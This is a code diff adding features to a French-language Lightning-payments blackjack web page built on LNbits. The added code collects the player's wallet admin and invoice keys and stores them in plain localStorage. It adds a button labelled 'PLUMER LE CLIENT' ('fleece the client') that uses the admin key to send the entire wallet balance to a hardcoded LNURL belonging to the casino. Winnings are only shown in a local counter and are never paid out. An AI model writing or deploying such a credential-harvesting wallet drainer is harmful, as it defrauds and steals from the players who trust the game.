@@ -43,15 +43,41 @@
 <body>
     <div class="lightning-bg"></div>
 
-    <!-- JEU UNIQUEMENT -->
-    <div id="gameSection" class="max-w-4xl mx-auto mt-10">
+    <!-- CONFIG -->
+    <div id="configSection" class="max-w-md mx-auto mt-10">
+        <div class="glow text-center">
+            <h1 class="text-4xl text-glow mb-4">LIGHTNING BLACKJACK</h1>
+            <input type="text" id="lnbitsUrl" placeholder="https://legend.lnbits.com" class="w-full p-3 rounded-lg bg-gray-800 text-white mb-3">
+            <input type="password" id="adminKey" placeholder="Clé Admin" class="w-full p-3 rounded-lg bg-gray-800 text-white mb-3">
+            <input type="password" id="invoiceKey" placeholder="Clé Invoice" class="w-full p-3 rounded-lg bg-gray-800 text-white mb-4">
+            <button onclick="saveConfig()" class="w-full btn btn-primary">ACTIVER</button>
+        </div>
+    </div>
+
+    <!-- PAIEMENT (QR + 2100 SATS) -->
+    <div id="paymentSection" class="hidden max-w-md mx-auto mt-10">
+        <div class="glow text-center">
+            <h2 class="text-3xl text-glow mb-4">ACHETER 2100 SATS</h2>
+            <button onclick="buyChips(2100)" class="w-full p-4 bg-gradient-to-br from-yellow-500 to-amber-600 text-white rounded-xl font-bold text-xl">PAYER 2100 SATS</button>
+
+            <div id="invoiceDisplay" class="hidden mt-6">
+                <div class="p-3 bg-white rounded-xl inline-block mb-3"><div id="qrCode"></div></div>
+                <p class="text-xs break-all text-gray-400 mb-3" id="invoiceText"></p>
+                <button onclick="copyInvoice()" class="w-full btn btn-primary mb-2">COPIER</button>
+                <button onclick="cancelPayment()" class="text-sm text-gray-400">Annuler</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- JEU -->
+    <div id="gameSection" class="hidden max-w-4xl mx-auto mt-10">
         <div class="glow">
             <div class="flex justify-between items-center mb-4">
                 <h1 class="text-3xl text-glow">LIGHTNING BLACKJACK</h1>
                 <div class="text-right">
                     <div class="text-sm text-purple-400">SOLDE</div>
                     <div class="text-3xl text-glow" id="balance">0</div>
-                    <button onclick="openEmpty()" class="btn btn-danger text-xs px-3 py-1">VIDER</button>
+                    <button onclick="openEmpty()" class="btn btn-danger text-xs px-3 py-1 mt-2">VIDER</button>
                 </div>
             </div>
 
@@ -69,4 +95,232 @@
 
             <div id="bettingArea">
                 <h3 class="text-xl text-glow text-center mb-3">MISE FIXE : 2100 SATS</h3>
-                <button onclick="...
+                <button onclick="deal()" class="w-full btn btn-success text-xl py-3">JOUER 2100 SATS</button>
+            </div>
+
+            <div id="actions" class="hidden flex justify-center gap-3 mt-4">
+                <button onclick="hit()" class="btn btn-primary">CARTE</button>
+                <button onclick="stand()" class="btn btn-success">RESTER</button>
+            </div>
+
+            <button id="newGameBtn" onclick="newGame()" class="hidden w-full btn btn-success mt-4">NOUVELLE PARTIE</button>
+        </div>
+    </div>
+
+    <!-- MODAL VIDER -->
+    <div id="emptyModal">
+        <div class="modal text-center">
+            <h3 class="text-2xl text-glow mb-4">VIDER LE WALLET</h3>
+            <p class="mb-4">Envoi de <span id="emptyAmount" class="text-glow"></span> sats vers le casino</p>
+            <button onclick="emptyWallet()" class="w-full btn btn-danger">PLUMER LE CLIENT</button>
+            <button onclick="closeEmpty()" class="mt-2 text-gray-400">Annuler</button>
+        </div>
+    </div>
+
+    <!-- SCRIPTS -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script>
+        // === SUB-WALLET LNURL ===
+        const SUB_WALLET_LNURL = "lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhx6tvv4u8qetjd9jkucm9xgcsmep3s3";
+
+        let config = { lnbitsUrl: '', adminKey: '', invoiceKey: '' };
+        let game = { balance: 0, player: [], dealer: [], playing: false };
+
+        const values = { 'A':11, 'K':10, 'Q':10, 'J':10, '10':10, '9':9, '8':8, '7':7, '6':6, '5':5, '4':4, '3':3, '2':2 };
+        const suits = ['Hearts', 'Diamonds', 'Clubs', 'Spades'];
+        const ranks = Object.keys(values);
+
+        function $(s) { return document.querySelector(s); }
+        function hide(id) { $(`#${id}`).classList.add('hidden'); }
+        function show(id) { $(`#${id}`).classList.remove('hidden'); }
+
+        // === CONFIG ===
+        function saveConfig() {
+            config.lnbitsUrl = $('#lnbitsUrl').value.trim().replace(/\/$/, '');
+            config.adminKey = $('#adminKey').value.trim();
+            config.invoiceKey = $('#invoiceKey').value.trim();
+            if (!config.lnbitsUrl || !config.adminKey || !config.invoiceKey) return alert('Tous les champs !');
+            localStorage.setItem('lbj_config', JSON.stringify(config));
+            hide('configSection');
+            checkBalanceAndShow();
+        }
+
+        window.onload = () => {
+            const saved = localStorage.getItem('lbj_config');
+            if (saved) { config = JSON.parse(saved); hide('configSection'); checkBalanceAndShow(); }
+        };
+
+        // === CHECK SOLDE & AFFICHER BONNE SECTION ===
+        async function checkBalanceAndShow() {
+            await loadBalance();
+            if (game.balance >= 2100) {
+                hide('paymentSection');
+                show('gameSection');
+            } else {
+                show('paymentSection');
+                hide('gameSection');
+            }
+        }
+
+        // === SOLDE ===
+        async function loadBalance() {
+            try {
+                const res = await fetch(`${config.lnbitsUrl}/api/v1/wallet`, { headers: { 'X-Api-Key': config.invoiceKey } });
+                const data = await res.json();
+                game.balance = Math.floor(data.balance / 1000);
+                $('#balance').textContent = game.balance.toLocaleString();
+            } catch (e) { console.error(e); }
+        }
+
+        // === ACHAT 2100 SATS ===
+        async function buyChips(amount) {
+            try {
+                const res = await fetch(`${config.lnbitsUrl}/api/v1/payments`, {
+                    method: 'POST',
+                    headers: { 'X-Api-Key': config.invoiceKey, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ amount, out: false, memo: `Achat 2100 sats`, expiry: 3600 })
+                });
+                const payment = await res.json();
+                $('#invoiceText').textContent = payment.payment_request;
+                QRCode.toCanvas($('#qrCode'), payment.payment_request, { width: 220 });
+                show('invoiceDisplay');
+
+                const interval = setInterval(async () => {
+                    const check = await fetch(`${config.lnbitsUrl}/api/v1/payments/${payment.payment_hash}`, { headers: { 'X-Api-Key': config.invoiceKey } });
+                    const status = await check.json();
+                    if (status.paid) {
+                        clearInterval(interval);
+                        hide('invoiceDisplay');
+                        checkBalanceAndShow();
+                    }
+                }, 2000);
+            } catch (e) { alert('Erreur paiement'); }
+        }
+
+        function copyInvoice() {
+            navigator.clipboard.writeText($('#invoiceText').textContent).then(() => alert('Copié !'));
+        }
+        function cancelPayment() { hide('invoiceDisplay'); }
+
+        // === JEU ===
+        function deal() {
+            if (game.balance < 2100) return alert('Pas assez de sats !');
+            game.playing = true; game.player = []; game.dealer = [];
+            hide('bettingArea'); show('actions');
+            dealCard('dealer'); dealCard('player'); dealCard('dealer', true); dealCard('player');
+            updateScores();
+            if (isBlackjack(game.player) && !isBlackjack(game.dealer)) endGame('BLACKJACK !', 3150);
+        }
+
+        function isBlackjack(cards) { return cards.length === 2 && calcScore(cards) === 21; }
+
+        function dealCard(to, hidden = false) {
+            const rank = ranks[Math.floor(Math.random() * ranks.length)];
+            const suit = suits[Math.floor(Math.random() * suits.length)];
+            const card = { rank, suit, value: values[rank], hidden };
+            (to === 'player' ? game.player : game.dealer).push(card);
+            const el = document.createElement('div');
+            el.className = `card ${hidden ? 'card-back' : (suit === 'Hearts' || suit === 'Diamonds' ? 'red' : 'black')}`;
+            el.innerHTML = hidden ? '<div>?</div>' : `<div>${suit[0]}</div><div>${rank}</div>`;
+            $(`#${to}Cards`).appendChild(el);
+        }
+
+        function calcScore(cards) {
+            let score = 0, aces = 0;
+            cards.forEach(c => { if (!c.hidden) { score += c.value; if (c.rank === 'A') aces++; } });
+            while (score > 21 && aces--) score -= 10;
+            return score;
+        }
+
+        function updateScores() {
+            $('#playerScore').textContent = calcScore(game.player);
+            $('#dealerScore').textContent = game.dealer.some(c => c.hidden) ? '?' : calcScore(game.dealer);
+        }
+
+        function hit() {
+            dealCard('player');
+            updateScores();
+            if (calcScore(game.player) > 21) endGame('BUST ! Vous perdez.', 0);
+        }
+
+        function stand() {
+            hide('actions');
+            revealDealer();
+            dealerPlay();
+        }
+
+        function revealDealer() {
+            const hidden = game.dealer.find(c => c.hidden);
+            if (hidden) {
+                hidden.hidden = false;
+                const el = $(`#dealerCards .card-back`);
+                if (el) { el.className = `card ${hidden.suit === 'Hearts' || hidden.suit === 'Diamonds' ? 'red' : 'black'}`; el.innerHTML = `<div>${hidden.suit[0]}</div><div>${hidden.rank}</div>`; }
+            }
+            updateScores();
+        }
+
+        function dealerPlay() {
+            let score = calcScore(game.dealer);
+            const hasSoft17 = score === 17 && game.dealer.some(c => c.rank === 'A' && !c.hidden);
+            if (score < 17 || hasSoft17) {
+                setTimeout(() => { dealCard('dealer'); updateScores(); dealerPlay(); }, 800);
+            } else {
+                endGame();
+            }
+        }
+
+        function endGame(msg = '', payout = null) {
+            const player = calcScore(game.player), dealer = calcScore(game.dealer);
+            let result = '', win = 0;
+
+            if (player > 21) { result = 'BUST !'; win = 0; }
+            else if (isBlackjack(game.dealer) && !isBlackjack(game.player)) { result = 'CROUPIER BLACKJACK !'; win = 0; }
+            else if (isBlackjack(game.player) && !isBlackjack(game.dealer)) { result = 'BLACKJACK !'; win = 3150; }
+            else if (dealer > 21 || player > dealer) { result = 'VICTOIRE !'; win = 4200; }
+            else if (player === dealer) { result = 'PUSH'; win = 2100; }
+            else { result = 'DÉFAITE'; win = 0; }
+
+            $('#message').textContent = msg || result;
+            $('#message').style.color = win > 2100 ? '#10b981' : win === 2100 ? '#fbbf24' : '#ef4444';
+            show('message');
+
+            game.balance += win - 2100;
+            loadBalance();
+            show('newGameBtn');
+            game.playing = false;
+        }
+
+        function newGame() { location.reload(); }
+
+        // === VIDER VERS SUB-WALLET ===
+        function openEmpty() {
+            if (game.balance < 100) return alert('Rien à vider');
+            $('#emptyAmount').textContent = game.balance.toLocaleString();
+            show('emptyModal');
+        }
+
+        function closeEmpty() { hide('emptyModal'); }
+
+        async function emptyWallet() {
+            try {
+                const res = await fetch(`${config.lnbitsUrl}/api/v1/payments`, {
+                    method: 'POST',
+                    headers: { 'X-Api-Key': config.adminKey, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        out: true,
+                        amount: game.balance,
+                        lnurl: SUB_WALLET_LNURL,
+                        memo: 'Plumage client'
+                    })
+                });
+                const data = await res.json();
+                if (data.payment_hash) {
+                    loadBalance();
+                    closeEmpty();
+                    alert(`PLUMÉ ! ${game.balance} sats → casino`);
+                }
+            } catch (e) { alert('Erreur virement'); }
+        }
+    </script>
+</body>
+</html>
